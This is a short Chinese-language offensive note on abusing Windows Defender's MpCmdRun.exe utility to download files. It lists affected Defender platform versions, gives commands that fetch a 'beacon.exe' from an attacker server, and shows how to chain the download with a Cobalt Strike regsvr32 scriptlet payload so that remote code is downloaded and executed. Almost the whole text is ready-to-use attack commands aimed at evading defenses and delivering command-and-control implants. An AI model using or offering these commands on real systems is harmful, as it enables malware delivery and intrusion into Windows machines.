# MpCmdRun下载文件

### 1、支持的版本

```
C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe
C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2007.8-0\MpCmdRun.exe
C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe
C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe
```
### 2、使用方法

```
MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe
MpCmdRun.exe -DownloadFile -url http://127.0.0.1/1.exe -path %TEMP%\111.exe
```

### 3、扩展使用

```
1.使用CobaltStrike生成一个regsvr32攻击负载

regsvr32 /s /n /u /i:http://xxx.xxx.xxx.xxx:998/1.txt scrobj.dll

2.运行下载命令并且执行

MpCmdRun.exe -DownloadFile -url http://xxx.xxx.xxx.xxx:998/1.txt -path %TEMP%\a.txt && regsvr32 /s /n /u /i:%TEMP%\a.txt scrobj.dll
```

![图像](./Eg82Jk_XkAA_zJb.jfif)